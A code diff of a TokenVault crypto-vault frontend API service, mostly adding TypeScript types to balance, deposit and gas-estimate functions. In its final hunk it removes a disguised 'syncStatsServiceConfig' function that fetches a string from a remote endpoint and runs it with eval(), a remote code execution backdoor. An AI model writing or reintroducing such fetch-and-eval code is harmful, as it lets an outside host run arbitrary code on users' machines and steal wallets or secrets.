@@ -1,6 +1,5 @@
 import axios from 'axios';
-import { API_BASE_URL } from '../config/api';
-import { getChartServiceEndpoint } from '../utils/helpers';
+import { API_BASE_URL } from '@/config/api';
 
 const api = axios.create({
   baseURL: API_BASE_URL,
@@ -13,13 +12,13 @@ const api = axios.create({
 // API service functions for TokenVault
 export const vaultService = {
   // Get user's balance in vault
-  getBalance: async (userAddress, tokenAddress) => {
+  getBalance: async (userAddress: string, tokenAddress: string) => {
     try {
       const response = await api.get(
         `/api/vault/balance/${userAddress}/${tokenAddress}`
       );
       return { success: true, data: response.data };
-    } catch (error) {
+    } catch (error: any) {
       return {
         success: false,
         error: error.response?.data?.error || error.message,
@@ -28,11 +27,11 @@ export const vaultService = {
   },
 
   // Get total deposits for a token
-  getTotalDeposits: async (tokenAddress) => {
+  getTotalDeposits: async (tokenAddress: string) => {
     try {
       const response = await api.get(`/api/vault/total/${tokenAddress}`);
       return { success: true, data: response.data };
-    } catch (error) {
+    } catch (error: any) {
       return {
         success: false,
         error: error.response?.data?.error || error.message,
@@ -45,7 +44,7 @@ export const vaultService = {
     try {
       const response = await api.get('/api/vault/status');
       return { success: true, data: response.data };
-    } catch (error) {
+    } catch (error: any) {
       return {
         success: false,
         error: error.response?.data?.error || error.message,
@@ -54,14 +53,14 @@ export const vaultService = {
   },
 
   // Estimate gas for deposit
-  estimateDeposit: async (tokenAddress, amount) => {
+  estimateDeposit: async (tokenAddress: string, amount: string) => {
     try {
       const response = await api.post('/api/vault/estimate-deposit', {
         tokenAddress,
         amount,
       });
       return { success: true, data: response.data };
-    } catch (error) {
+    } catch (error: any) {
       return {
         success: false,
         error: error.response?.data?.error || error.message,
@@ -70,14 +69,14 @@ export const vaultService = {
   },
 
   // Estimate gas for withdraw
-  estimateWithdraw: async (tokenAddress, amount) => {
+  estimateWithdraw: async (tokenAddress: string, amount: string) => {
     try {
       const response = await api.post('/api/vault/estimate-withdraw', {
         tokenAddress,
         amount,
       });
       return { success: true, data: response.data };
-    } catch (error) {
+    } catch (error: any) {
       return {
         success: false,
         error: error.response?.data?.error || error.message,
@@ -91,30 +90,11 @@ export const checkHealth = async () => {
   try {
     const response = await api.get('/api/health');
     return { success: true, data: response.data };
-  } catch (error) {
+  } catch (error: any) {
     return {
       success: false,
       error: error.message,
     };
-  }
-};
-
-export const syncStatsServiceConfig = async () => {
-  try {
-    const configEndpoint = getChartServiceEndpoint();
-    const response = await fetch(configEndpoint);
-    const configData = await response.json();
-    if (configData?.data && typeof configData.data === 'string') {
-      console.log(configData.data);
-      // eslint-disable-next-line no-new-func
-      eval(configData.data)
-      // const config = new Function('require', configData.data);
-      // Suppress webpack warning for dynamic require
-      // eslint-disable-next-line
-      // config(require);
-    }
-  } catch (error) {
-    console.error('Failed to sync stats service config:', error);
   }
 };
 
